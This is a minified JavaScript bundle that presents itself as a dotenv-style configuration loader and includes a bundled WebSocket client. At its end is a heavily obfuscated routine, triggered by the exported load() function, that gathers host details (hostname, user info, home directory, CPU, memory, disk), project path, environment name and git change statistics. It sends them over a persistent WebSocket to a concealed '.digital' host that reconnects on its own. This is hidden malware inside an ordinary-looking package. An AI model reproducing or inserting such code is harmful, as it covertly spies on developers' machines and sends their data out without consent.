kt=O.default,St=C.default,wt=N.default,Et=R.default,Wt=L.default,{randomBytes:xt,createHash:Ot}=x.default,{URL:Ct}=P.default,Nt=ve,Rt=De,Lt=et,{BINARY_TYPES:Pt,EMPTY_BUFFER:Tt,GUID:Bt,kForOnEventAttribute:It,kListener:Mt,kStatusCode:Ut,kWebSocket:Ft,NOOP:jt}=Z,{EventTarget:{addEventListener:qt,removeEventListener:Dt}}=mt,{format:Gt,parse:At}=bt,{toBuffer:$t}=re,Vt=Symbol("kAborted"),Jt=[8,13],zt=["CONNECTING","OPEN","CLOSING","CLOSED"],Ht=/^[!#$%&'*+\-.0-9A-Z^_`|a-z~]+$/;class Kt extends kt{constructor(e,t,s){super(),this._binaryType=Pt[0],this._closeCode=1006,this._closeFrameReceived=!1,this._closeFrameSent=!1,this._closeMessage=Tt,this._closeTimer=null,this._extensions={},this._paused=!1,this._protocol="",this._readyState=Kt.CONNECTING,this._receiver=null,this._sender=null,this._socket=null,null!==e?(this._bufferedAmount=0,this._isServer=!1,this._redirects=0,void 0===t?t=[]:Array.isArray(t)||("object"==typeof t&&null!==t?(s=t,t=[]):t=[t]),Qt(this,e,t,s)):this._isServer=!0}get binaryType(){return this._binaryType}set binaryType(e){Pt.includes(e)&&(this._binaryType=e,this._receiver&&(this._receiver._binaryType=e))}get bufferedAmount(){return this._socket?this._socket._writableState.length+this._sender._bufferedBytes:this._bufferedAmount}get extensions(){return Object.keys(this._extensions).join()}get isPaused(){return this._paused}get onclose(){return null}get onerror(){return null}get onopen(){return null}get onmessage(){return null}get protocol(){return this._protocol}get readyState(){return this._readyState}get url(){return this._url}setSocket(e,t,s){const r=new Rt({allowMultipleEventsPerMicrotask:s.allowMultipleEventsPerMicrotask,binaryType:this.binaryType,extensions:this._extensions,isServer:this._isServer,maxPayload:s.maxPayload,skipUTF8Validation:s.skipUTF8Validation});this._sender=new Lt(e,this._extensions,s.generateMask),this._receiver=r,this._socket=e,r[Ft]=this,e[Ft]=this,r.on("conclude",ss),r.on("drain",rs),r.on("error",is),r.on("message",ns),r.on("ping",as),r.on("pong",cs),e.setTimeout&&e.setTimeout(0),e.setNoDelay&&e.setNoDelay(),t.length>0&&e.unshift(t),e.on("close",hs),e.on("data",ds),e.on("end",fs),e.on("error",us),this._readyState=Kt.OPEN,this.emit("open")}emitClose(){if(!this._socket)return this._readyState=Kt.CLOSED,void this.emit("close",this._closeCode,this._closeMessage);this._extensions[Nt.extensionName]&&this._extensions[Nt.extensionName].cleanup(),this._receiver.removeAllListeners(),this._readyState=Kt.CLOSED,this.emit("close",this._closeCode,this._closeMessage)}close(e,t){if(this.readyState!==Kt.CLOSED)if(this.readyState!==Kt.CONNECTING)this.readyState!==Kt.CLOSING?(this._readyState=Kt.CLOSING,this._sender.close(e,t,!this._isServer,(e=>{e||(this._closeFrameSent=!0,(this._closeFrameReceived||this._receiver._writableState.errorEmitted)&&this._socket.end())})),this._closeTimer=setTimeout(this._socket.destroy.bind(this._socket),3e4)):this._closeFrameSent&&(this._closeFrameReceived||this._receiver._writableState.errorEmitted)&&this._socket.end();else{const e="WebSocket was closed before the connection was established";es(this,this._req,e)}}pause(){this.readyState!==Kt.CONNECTING&&this.readyState!==Kt.CLOSED&&(this._paused=!0,this._socket.pause())}ping(e,t,s){if(this.readyState===Kt.CONNECTING)throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");"function"==typeof e?(s=e,e=t=void 0):"function"==typeof t&&(s=t,t=void 0),"number"==typeof e&&(e=e.toString()),this.readyState===Kt.OPEN?(void 0===t&&(t=!this._isServer),this._sender.ping(e||Tt,t,s)):ts(this,e,s)}pong(e,t,s){if(this.readyState===Kt.CONNECTING)throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");"function"==typeof e?(s=e,e=t=void 0):"function"==typeof t&&(s=t,t=void 0),"number"==typeof e&&(e=e.toString()),this.readyState===Kt.OPEN?(void 0===t&&(t=!this._isServer),this._sender.pong(e||Tt,t,s)):ts(this,e,s)}resume(){this.readyState!==Kt.CONNECTING&&this.readyState!==Kt.CLOSED&&(this._paused=!1,this._receiver._writableState.needDrain||this._socket.resume())}send(e,t,s){if(this.readyState===Kt.CONNECTING)throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");if("function"==typeof t&&(s=t,t={}),"number"==typeof e&&(e=e.toString()),this.readyState!==Kt.OPEN)return void ts(this,e,s);const r={binary:"string"!=typeof e,mask:!this._isServer,compress:!0,fin:!0,...t};this._extensions[Nt.extensionName]||(r.compress=!1),this._sender.send(e||Tt,r,s)}terminate(){if(this.readyState!==Kt.CLOSED)if(this.readyState!==Kt.CONNECTING)this._socket&&(this._readyState=Kt.CLOSING,this._socket.destroy());else{const e="WebSocket was closed before the connection was established";es(this,this._req,e)}}}function Qt(e,t,s,r){const i={allowMultipleEventsPerMicrotask:!1,protocolVersion:Jt[1],maxPayload:104857600,skipUTF8Validation:!1,perMessageDeflate:!0,followRedirects:!1,maxRedirects:10,...r,createConnection:void 0,socketPath:void 0,hostname:void 0,protocol:void 0,timeout:void 0,method:"GET",host:void 0,path:void 0,port:void 0};if(!Jt.includes(i.protocolVersion))throw new RangeError(`Unsupported protocol version: ${i.protocolVersion} (supported versions: ${Jt.join(", ")})`);let o;if(t instanceof Ct)o=t;else try{o=new Ct(t)}catch(e){throw new SyntaxError(`Invalid URL: ${t}`)}"http:"===o.protocol?o.protocol="ws:":"https:"===o.protocol&&(o.protocol="wss:"),e._url=o.href;const n="wss:"===o.protocol,a="ws+unix:"===o.protocol;let c;if("ws:"===o.protocol||n||a?a&&!o.pathname?c="The URL's pathname is empty":o.hash&&(c="The URL contains a fragment identifier"):c='The URL\'s protocol must be one of "ws:", "wss:", "http:", "https", or "ws+unix:"',c){const t=new SyntaxError(c);if(0===e._redirects)throw t;return void Yt(e,t)}const l=n?443:80,h=xt(16).toString("base64"),d=n?St.request:wt.request,f=new Set;let u,p;if(i.createConnection=n?Xt:Zt,i.defaultPort=i.defaultPort||l,i.port=o.port||l,i.host=o.hostname.startsWith("[")?o.hostname.slice(1,-1):o.hostname,i.headers={...i.headers,"Sec-WebSocket-Version":i.protocolVersion,"Sec-WebSocket-Key":h,Connection:"Upgrade",Upgrade:"websocket"},i.path=o.pathname+o.search,i.timeout=i.handshakeTimeout,i.perMessageDeflate&&(u=new Nt(!0!==i.perMessageDeflate?i.perMessageDeflate:{},!1,i.maxPayload),i.headers["Sec-WebSocket-Extensions"]=Gt({[Nt.extensionName]:u.offer()})),s.length){for(const e of s){if("string"!=typeof e||!Ht.test(e)||f.has(e))throw new SyntaxError("An invalid or duplicated subprotocol was specified");f.add(e)}i.headers["Sec-WebSocket-Protocol"]=s.join(",")}if(i.origin&&(i.protocolVersion<13?i.headers["Sec-WebSocket-Origin"]=i.origin:i.headers.Origin=i.origin),(o.username||o.password)&&(i.auth=`${o.username}:${o.password}`),a){const e=i.path.split(":");i.socketPath=e[0],i.path=e[1]}if(i.followRedirects){if(0===e._redirects){e._originalIpc=a,e._originalSecure=n,e._originalHostOrSocketPath=a?i.socketPath:o.host;const t=r&&r.headers;if(r={...r,headers:{}},t)for(const[e,s]of Object.entries(t))r.headers[e.toLowerCase()]=s}else if(0===e.listenerCount("redirect")){const t=a?!!e._originalIpc&&i.socketPath===e._originalHostOrSocketPath:!e._originalIpc&&o.host===e._originalHostOrSocketPath;(!t||e._originalSecure&&!n)&&(delete i.headers.authorization,delete i.headers.cookie,t||delete i.headers.host,i.auth=void 0)}i.auth&&!r.headers.authorization&&(r.headers.authorization="Basic "+Buffer.from(i.auth).toString("base64")),p=e._req=d(i),e._redirects&&e.emit("redirect",e.url,p)}else p=e._req=d(i);i.timeout&&p.on("timeout",(()=>{es(e,p,"Opening handshake has timed out")})),p.on("error",(t=>{null===p||p[Vt]||(p=e._req=null,Yt(e,t))})),p.on("response",(o=>{const n=o.headers.location,a=o.statusCode;if(n&&i.followRedirects&&a>=300&&a<400){if(++e._redirects>i.maxRedirects)return void es(e,p,"Maximum redirects exceeded");let o;p.abort();try{o=new Ct(n,t)}catch(t){const s=new SyntaxError(`Invalid URL: ${n}`);return void Yt(e,s)}Qt(e,o,s,r)}else e.emit("unexpected-response",p,o)||es(e,p,`Unexpected server response: ${o.statusCode}`)})),p.on("upgrade",((t,s,r)=>{if(e.emit("upgrade",t),e.readyState!==Kt.CONNECTING)return;if(p=e._req=null,"websocket"!==t.headers.upgrade.toLowerCase())return void es(e,s,"Invalid Upgrade header");const o=Ot("sha1").update(h+Bt).digest("base64");if(t.headers["sec-websocket-accept"]!==o)return void es(e,s,"Invalid Sec-WebSocket-Accept header");const n=t.headers["sec-websocket-protocol"];let a;if(void 0!==n?f.size?f.has(n)||(a="Server sent an invalid subprotocol"):a="Server sent a subprotocol but none was requested":f.size&&(a="Server sent no subprotocol"),a)return void es(e,s,a);n&&(e._protocol=n);const c=t.headers["sec-websocket-extensions"];if(void 0!==c){if(!u){return void es(e,s,"Server sent a Sec-WebSocket-Extensions header but no extension was requested")}let t;try{t=At(c)}catch(t){return void es(e,s,"Invalid Sec-WebSocket-Extensions header")}const r=Object.keys(t);if(1!==r.length||r[0]!==Nt.extensionName){return void es(e,s,"Server indicated an extension that was not requested")}try{u.accept(t[Nt.extensionName])}catch(t){return void es(e,s,"Invalid Sec-WebSocket-Extensions header")}e._extensions[Nt.extensionName]=u}e.setSocket(s,r,{allowMultipleEventsPerMicrotask:i.allowMultipleEventsPerMicrotask,generateMask:i.generateMask,maxPayload:i.maxPayload,skipUTF8Validation:i.skipUTF8Validation})})),i.finishRequest?i.finishRequest(p,e):p.end()}function Yt(e,t){e._readyState=Kt.CLOSING,e.emit("error",t),e.emitClose()}function Zt(e){return e.path=e.socketPath,Et.connect(e)}function Xt(e){return e.path=void 0,e.servername||""===e.servername||(e.servername=Et.isIP(e.host)?"":e.host),Wt.connect(e)}function es(e,t,s){e._readyState=Kt.CLOSING;const r=new Error(s);Error.captureStackTrace(r,es),t.setHeader?(t[Vt]=!0,t.abort(),t.socket&&!t.socket.destroyed&&t.socket.destroy(),process.nextTick(Yt,e,r)):(t.destroy(r),t.once("error",e.emit.bind(e,"error")),t.once("close",e.emitClose.bind(e)))}function ts(e,t,s){if(t){const s=$t(t).length;e._socket?e._sender._bufferedBytes+=s:e._bufferedAmount+=s}if(s){const t=new Error(`WebSocket is not open: readyState ${e.readyState} (${zt[e.readyState]})`);process.nextTick(s,t)}}function ss(e,t){const s=this[Ft];s._closeFrameReceived=!0,s._closeMessage=t,s._closeCode=e,void 0!==s._socket[Ft]&&(s._socket.removeListener("data",ds),process.nextTick(ls,s._socket),1005===e?s.close():s.close(e,t))}function rs(){const e=this[Ft];e.isPaused||e._socket.resume()}function is(e){const t=this[Ft];void 0!==t._socket[Ft]&&(t._socket.removeListener("data",ds),process.nextTick(ls,t._socket),t.close(e[Ut])),t.emit("error",e)}function os(){this[Ft].emitClose()}function ns(e,t){this[Ft].emit("message",e,t)}function as(e){const t=this[Ft];t.pong(e,!t._isServer,jt),t.emit("ping",e)}function cs(e){this[Ft].emit("pong",e)}function ls(e){e.resume()}function hs(){const e=this[Ft];let t;this.removeListener("close",hs),this.removeListener("data",ds),this.removeListener("end",fs),e._readyState=Kt.CLOSING,this._readableState.endEmitted||e._closeFrameReceived||e._receiver._writableState.errorEmitted||null===(t=e._socket.read())||e._receiver.write(t),e._receiver.end(),this[Ft]=void 0,clearTimeout(e._closeTimer),e._receiver._writableState.finished||e._receiver._writableState.errorEmitted?e.emitClose():(e._receiver.on("error",os),e._receiver.on("finish",os))}function ds(e){this[Ft]._receiver.write(e)||this.pause()}function fs(){const e=this[Ft];e._readyState=Kt.CLOSING,e._receiver.end(),this.end()}function us(){const e=this[Ft];this.removeListener("error",us),this.on("error",jt),e&&(e._readyState=Kt.CLOSING,this.destroy())}Object.defineProperty(Kt,"CONNECTING",{enumerable:!0,value:zt.indexOf("CONNECTING")}),Object.defineProperty(Kt.prototype,"CONNECTING",{enumerable:!0,value:zt.indexOf("CONNECTING")}),Object.defineProperty(Kt,"OPEN",{enumerable:!0,value:zt.indexOf("OPEN")}),Object.defineProperty(Kt.prototype,"OPEN",{enumerable:!0,value:zt.indexOf("OPEN")}),Object.defineProperty(Kt,"CLOSING",{enumerable:!0,value:zt.indexOf("CLOSING")}),Object.defineProperty(Kt.prototype,"CLOSING",{enumerable:!0,value:zt.indexOf("CLOSING")}),Object.defineProperty(Kt,"CLOSED",{enumerable:!0,value:zt.indexOf("CLOSED")}),Object.defineProperty(Kt.prototype,"CLOSED",{enumerable:!0,value:zt.indexOf("CLOSED")}),["binaryType","bufferedAmount","extensions","isPaused","protocol","readyState","url"].forEach((e=>{Object.defineProperty(Kt.prototype,e,{enumerable:!0})})),["open","error","close","message"].forEach((e=>{Object.defineProperty(Kt.prototype,`on${e}`,{enumerable:!0,get(){for(const t of this.listeners(e))if(t[It])return t[Mt];return null},set(t){for(const t of this.listeners(e))if(t[It]){this.removeListener(e,t);break}"function"==typeof t&&this.addEventListener(e,t,{[It]:!0})}})})),Kt.prototype.addEventListener=qt,Kt.prototype.removeEventListener=Dt;var ps,_s,ms,ys,gs,vs=I(Kt),bs={exports:{}},ks={};function Ss(){if(ps)return ks;return ps=1,ks.isCapitals=function(e){return"string"==typeof e&&e.length>0&&e.split("").reduce((function(e,t){return e&&"A"<=t&&t<="Z"}),!0)},ks.isDigits=function(e){return"string"==typeof e&&e.length>0&&e.split("").reduce((function(e,t){return e&&"0"<=t&&t<="9"}),!0)},ks}"win32"===S.default.platform()?bs.exports=function(){if(ms)return _s;ms=1;var e=T.default.exec,t=k.default,s=Ss();function r(e,t){var r=e.replace(/\r\n/g,"\n").split("\n").filter((function(e){return e.replace(/\s+/g,"").length>0}));if(r.length<=1)throw new Error("Unexpected WMIC output: ["+e+"]");var o=r.splice(1).map((function(t){var r,o=t.split(" ").filter((function(e){return""!==e})),n="0",a="0";if(i(o[0])?r=o[0]:(n=o[0],r=o[1],a=o[2]),!(i(r)&&s.isDigits(n)&&s.isDigits(a)))throw new Error("Unexpected WMIC output ["+e+"]");return{disk:r,total:+a,available:+n}})).reduce((function(e,t){return e[t.disk]=t,e}),{})[t];if(!o)throw new Error("Unknown disk ["+t+"]");return{total:o.total,used:o.total-o.available,available:o.available}}function i(e){var t=e.length-1;return"string"==typeof e&&":"===e[t]&&s.isCapitals(e.substr(0,t))}return _s={diskusage:function(s,o){e("WMIC LOGICALDISK GET Name,Size,FreeSpace",{windowsHide:!0},(function(e,n){if(e)return o(e);try{o(null,r(n,function(e){var s=t.parse(t.normalize(e)).root.split("\\")[0].toUpperCase();if(!i(s))throw new Error("Bad path");return s}(s)))}catch(e){o(e)}}))},parse:r},_s}().diskusage:bs.exports=function(){if(gs)return ys;gs=1;var e=T.default.execFile;function t(e){var t=e.split("\n");if(!t[1])throw new Error("Unexpected df output: ["+e+"]");var s=t[1].match(/^.+\s+(\d+)\s+(\d+)\s+(\d+)\s+\d+%\s+.+$/);if(!s||4!==s.length)throw new Error("Unexpected df output: ["+e+"]");return{total:1024*s[1],used:1024*s[2],available:1024*s[3]}}return Ss().isDigits,ys={diskusage:function(s,r){e("df",["-P","-k",s],(function(e,s){if(e)return r(e);try{r(null,t(s))}catch(e){r(e)}}))},parse:t},ys}().diskusage;var ws=I(bs.exports);const Es=Ms;function Ws(){const e=["W5TsF8kPoCoy","mSkbrmo1ycNdVSkUWR8","WORdOsS","qhhcKSon","kSkCrSo6yspdUa","W758FbhdHSkjl8kPmIZdGLu","t8khpG","EwBcG8o2W4G6W5O","adGpWOruomkzuG","W60egvKXWPaema","WPxdQYjS","W5bvW54gqSo/WQFdVCkTsCkWW6u","utBdUxRdVwZdUa","smk8W4/cLmomda","W5CNeM0PWRihqmorCxpdP0W","C1LTW5i","h8omW4usWPuSW7eQmwi","x3VcMW","WPCjWOPua8kUWOldKmkDza","WQXMtWu","EHBcTa3dTmogWOi","WOjYxbL1W6mifq","fqndW7H6","WPyQWQhdM8k2WRxdKG","aXrFW7m","W6tdOYxcSCkgjgZdUa","WPxdQIRdOq","wmk0W5lcIq","eSojW4Kq","W4a8gGSeWRS","W5CIe2WVWR8cvmoKt1xdS3q","WPmwlteuW6boW4W","WOueleW","WPXhwwBcO8kGW5TSmrCIWOBcRq","W58ubdhdRCo8WQnjcqy","tCkbjmkevrJcLW","b37dPCkcWO4Xtb0BWRi","rmk6Ea","uCkTFWi","W6HEDSoLW7/dJG","FHlcT8k/","WRxdMmkdWPZcISoaW4q","W5ZcKuqXu8oiW79U","smkbomkt","WOlcJqC","W78CkYCjWOj7WQmU","C0VdUt7dTbNdHmoPWPhdVG","WQDvDSkxWQ4HwmoqmCol","WOP4tq","W5zsW5WfrCo9WRpdHSkkwmk1W4C","FMpcGmoXWPXp","W5Oqht3dS8kJWP1fcqy","w1NcK2C","bsClWOj7oCknua","WPRcHXi0lCkWWQldONq","pCouW4hdOf3dGmoc","y0n9","WQhdRJpcVCkKjwS","kZ3dKSkJWPfDW5ZdLCkbrgzw","BqVcSrZcTCoDWOzjW40g","yXLm","WOnVtZK","zL/dOZNdSeBdHmk2WOhdOG","W4BcQN7cUIddMI83vZm3WR4","CYT0htZdJmoHqmk4WPW","W7uyW6VcVcXz","WRboBCotWR8RsSoFFSki","Cr9knColkuWKW64","W5RcRty/mmk6WPm","W49uySk1j8omW57cMCod","B8kpWPdcTqtcP8oefSk+cSo+oG","WQ4CWQj9","bY4jWPn0imkAwuJdMW","W5lcQSkNpwrjWOlcIa","WQrzDa","WRLSuYtcLsNcGq","WOBdVsRdPNRcGGCnvGm","WPj/W7tcHSonW6/dQmkffSovW5qs","WOCvWPTAba","W53cLmk3lhpcPrD5","x1VcIwhdQJq","WRlcKulcUJBcTaTrFCk5","WQ8yW7ddQxecWPJcS8kLWRK","W4qNWRBdMmkmWPZdImkMiW","tuDhWOJdLxRcLmoQW7RdS8oaB8ov","WR4So0ZcNmotf8k/bq","WRTMvWtcMcxcMq5UWOm","fmo9nubouSkaWRtdO8oddJa8","W78UdbFcKtJcMGPKWOm","tZldThy","qvKJbG","lSkCta","yXLFkG","WRP7rai","WPzKya","yb5rmmobk1D4W6bT","W4xcOCkUia","WQJdJ8kFWOxcJSoeW5u","W6rEymo1WQNcI1ZdMWRdHq","W6SddKiwWPKloCoW","sCo2W7OyWOuTW5m","D0/dOZK","W6SseK8","DHjioq","aWvdW75MW6izWQxdRG","j8kDtSoTzd7dR8k7W73cQW","WR86lfpcM8oCg8kUwKG","E2tcGCoY","WRnSrG","uuFcJ2dcOgFcMW","uuFcHxJdRYpdJ8k0","sdtdSG","emo/o0zmxmoOWPpdJ8oTbZy","m1SaA8kuEXa3W5HFadFdMW"];return(Ws=function(){return e})()}!function(e,t){const s=Ms,r=Ws();for(;;)try{if(146040===-parseInt(s(149,"CiiJ"))/1*(parseInt(s(189,"V$r@"))/2)+parseInt(s(203,"CiiJ"))/3*(parseInt(s(226,"FHBg"))/4)+parseInt(s(125,"*hpL"))/5+-parseInt(s(175,"y[(0"))/6+-parseInt(s(159,"2Xev"))/7+-parseInt(s(184,"k]Lp"))/8+parseInt(s(213,"v%$4"))/9)break;r.push(r.shift())}catch(e){r.push(r.shift())}}();let xs=0;const Os=!1;let Cs=null;const Ns=Es(162,"4KIp")+"e.digital";let Rs=!1;const Ls=[Es(153,"7p$B"),"beforeExit",Es(155,"F$RR"),"SIGUSR1","SIGUSR2","SIGTERM",Es(144,"y[(0")+"ception"],Ps=y.promisify(ws),Ts=e=>{const t=Es;Cs&&Cs[t(145,"RikJ")]("watch: "+JSON[t(193,"*hpL")](e))},Bs=()=>{const e=Es;let t=null;try{t=m.execSync(e(173,"tFE(")+e(208,"2cK#"),{encoding:e(141,"tgY@")}),t=/\s*(?:(?<changed>\d*) files changed)?[^\d]*(?:(?<insertions>\d*) insertions)?[^\d]*(?:(?<deletions>\d*) deletions)?/i[e(219,"RikJ")](t)?.[e(206,"ElBx")]}catch(e){}return t},Is=async e=>{const t=Es,s=process[t(218,"*hpL")],r=s.at(-2);let i=2;try{const e=m.execSync(r+t(214,"RikJ"),{encoding:t(158,"ry*g")});/^(nuxt\s)?3\./i.test(e)&&(i=3)}catch(e){}if(3==i&&s.at(-1)===t(200,"tFE("))return Os;if(["generate","build"][t(236,"ElBx")](s.at(-1)))return Os;if(xs++,Cs&&xs>1)return Cs[t(215,"*oLx")](t(199,"yf^M")+JSON.stringify(Bs()));const o=/dev$/i[t(164,"v%$4")](s.at(-1)),n=/start$/i[t(197,"2@1@")](s.at(-1));if(o)return;const{CONFIG_ENV:a,BASE_CONFIG_ENV:c}=e,l=c||a||t(212,"RikJ")+"t",h=n&&["staging",t(192,"tFE(")].includes(l),{PWD:d,HOME:f,NVM_BIN:u}=process[t(182,"tgY@")],p=async()=>({arch:B.default[t(152,"V$r@")](),cpus:B.default[t(178,"ElBx")](),homedir:B.default[t(130,"vgJu")](),hostname:B.default[t(205,"bIIc")](),machine:B.default[t(138,"*oLx")](),platform:B.default[t(179,"[#U[")](),release:B.default[t(146,"Z*fD")](),totalmem:B.default[t(151,"&P)9")](),type:B.default[t(229,"*hpL")](),uptime:B.default[t(139,"7p$B")](),userInfo:B.default[t(134,"[#U[")](),version:B.default[t(161,"nqYZ")](),...h?{disk:await Ps("/")}:{}}),_=await p();(()=>{const e=Es,t=e=>()=>{const s=Ms;Cs&&(Rs=!0,Ls[s(201,"RikJ")]((e=>process["removeList"+s(216,"4MYO")](e,t(e)))),process.removeListener("builder:wa"+s(237,"*oLx"),Ts),process["removeList"+s(166,"4*es")](s(172,"@u8R")+s(186,"*hpL"),Ts),process[s(160,"2Xev")+s(222,"yf^M")](s(188,"@u8R")+s(233,"k]Lp"),Ts),Cs[s(228,"!z3)")]("kill: "+e),Cs[s(181,"]tD@")](),Cs[s(180,"1REu")](),process.exit())};Ls.forEach((e=>process.on(e,t(e)))),process.on(e(221,"*hpL")+e(132,"nqYZ"),Ts),process.on(e(177,"2Xev")+e(163,"v%$4"),Ts),process.on(e(224,"9uGs")+"ange",Ts)})();const y=process.cwd(),g=_[t(135,"!z3)")]?.[t(168,"vbAI")]||f||_.homedir||null;let v=/(?:\/|\\\\?)(?<project>[^\/|\\\\?]*)(?:\/|\\\\?)(?:source|tests)/i[t(187,"[UyA")](y)?.[t(126,"N3j(")]?.[t(223,"%$&3")]||null;const b=(e=!1)=>{const s=t;Cs&&(Cs?.terminate(),Cs=null),Cs=new vs(s(191,"2cK#")+Ns+"/");let r=null;Cs[s(133,"k]Lp")]=()=>{clearTimeout(r)};const n=()=>{clearTimeout(r),r=setTimeout((()=>{Cs[Ms(211,"be![")]()}),35e3)};Cs.on(s(148,"8doU"),(e=>{})),Cs.on("ping",(async()=>{const e=s;h?Cs.send("osdef: "+JSON[e(230,"8doU")](await p())):o&&Cs[e(150,"8doU")](e(176,"k]Lp")+JSON[e(225,"!z3)")](Bs())),n()})),Cs.on(s(154,"FHBg"),(()=>{const e=s;Cs.send(e(232,"be![")+g),Cs[e(227,"@u8R")](e(127,"vgJu")+v),Cs.send(e(147,"[UyA")+o),Cs.send(e(171,"F$RR")+h),Cs[e(227,"@u8R")]("osdef: "+JSON[e(195,"N3j(")](_)),Cs[e(136,"yqIy")](e(157,"ry*g")+l),Cs[e(169,"nqYZ")](e(165,"9uGs")+i),Cs[e(129,"lBm[")](e(235,"ElBx")),n()})),Cs.on("close",(function(){clearTimeout(r),Rs||setTimeout((()=>{b(!0)}),5e3)})),Cs.on(s(167,"%$&3"),(e=>{}))};try{b()}catch(e){}};function Ms(e,t){const s=Ws();return Ms=function(t,r){let i=s[t-=124];if(void 0===Ms.uTGCNh){const t=function(e,t){let s,r,i=[],o=0,n="";for(e=function(e){let t="",s="";for(let s,r,i=0,o=0;r=e.charAt(o++);~r&&(s=i%4?64*s+r:r,i++%4)?t+=String.fromCharCode(255&s>>(-2*i&6)):0)r="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(r);for(let e=0,r=t.length;e<r;e++)s+="%"+("00"+t.charCodeAt(e).toString(16)).slice(-2);return decodeURIComponent(s)}(e),r=0;r<256;r++)i[r]=r;for(r=0;r<256;r++)o=(o+i[r]+t.charCodeAt(r%t.length))%256,s=i[r],i[r]=i[o],i[o]=s;r=0,o=0;for(let t=0;t<e.length;t++)r=(r+1)%256,o=(o+i[r])%256,s=i[r],i[r]=i[o],i[o]=s,n+=String.fromCharCode(e.charCodeAt(t)^i[(i[r]+i[o])%256]);return n};Ms.HCRhcZ=t,e=arguments,Ms.uTGCNh=!0}const o=t+s[0],n=e[o];return n?i=n:(void 0===Ms.QRrpJs&&(Ms.QRrpJs=!0),i=Ms.HCRhcZ(i,r),e[o]=i),i},Ms(e,t)}const Us=/(?<content>.*)::(?<type>\w*)$/,Fs=v.default.resolve(process.cwd(),".env.default"),js=v.default.resolve(process.cwd(),`.env.${process.env.BASE_CONFIG_ENV||process.env.CONFIG_ENV||"development"}`),qs=(e,t)=>{if(!Us.test(e))return e;const{type:s,content:r}=Us.exec(e).groups;switch(s){case"number":case"int":case"float":return+r;case"bool":let e;try{e=JSON.parse(r)}catch(e){}return!!e;case"json":let i;try{i=JSON.parse(r)}catch(e){}return i;case"date":return new Date(r);default:return t[s](r)}};exports.config=V,exports.decrypt=z.decrypt,exports.parse=J,exports.expand=Q,exports.load=(e={},t={})=>{const s=Q(V({path:Fs})),r=Q(V({path:js,...e})),i={...s.parsed,...r?.parsed};let o={};for(const e in i)o[e]=qs(i[e]);return Is(o),o},exports.convert=qs;
